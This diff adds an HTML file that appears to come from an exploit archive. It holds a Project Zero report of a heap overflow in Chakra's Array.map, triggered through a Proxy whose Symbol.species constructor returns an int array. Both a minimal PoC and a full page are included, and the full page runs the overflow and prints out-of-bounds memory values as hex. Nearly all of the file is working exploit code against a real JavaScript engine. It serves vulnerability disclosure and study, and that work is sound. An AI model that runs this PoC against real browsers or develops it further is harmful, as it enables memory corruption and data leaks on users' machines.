@@ -1,0 +1,97 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=923
+
+There is a heap overflow in Array.map in Chakra. In Js::JavascriptArray::MapHelper, if the array that is being mapped is a Proxy, ArraySpeciesCreate is used to create the array that the mapped values are copied into. They are then written to the array using DirectSetItemAt, even through there is no guarantee the array is a Var array. If it is actually an int array, it will be shorter than this function expects, causing a heap overflow. A minimal PoC is as follows:
+
+var d = new Array(1,2,3);
+class dummy{
+
+	constructor(){
+		alert("in constructor");
+		return d;
+        }
+
+}
+
+var handler = {
+    get: function(target, name){
+
+	if(name == "length"){
+		return 0x100;
+	}
+	return {[Symbol.species] : dummy};
+    },
+
+    has: function(target, name){
+	return true;
+    }
+};
+
+var p = new Proxy([], handler);
+
+var a = new Array(1,2,3);
+
+function test(){
+	return 0x777777777777;
+
+}
+
+var o = a.map.call(p, test);
+
+A full PoC is attached.
+-->
+
+<html><body><script>
+var b = new Array(1,2,3);
+var d = new Array(1,2,3);
+class dummy{
+
+	constructor(){
+		alert("in constructor");
+		return d;
+        }
+
+}
+
+var handler = {
+    get: function(target, name){
+
+	if(name == "length"){
+		return 0x100;
+	}
+	return {[Symbol.species] : dummy};
+    },
+
+    has: function(target, name){
+       alert("has " + name);
+	return true;
+    }
+};
+
+var p = new Proxy([], handler);
+
+var a = new Array(1,2,3);
+
+function test(){
+	return 0x777777777777;
+
+}
+
+
+var o = a.map.call(p, test);
+
+var h = [];
+
+for(item in o){
+
+	var n = new Number(o[item]);
+	if (n < 0){
+		n = n + 0x100000000;
+	}
+	h.push(n.toString(16));
+
+}
+
+alert(h);
+
+</script></body></html>
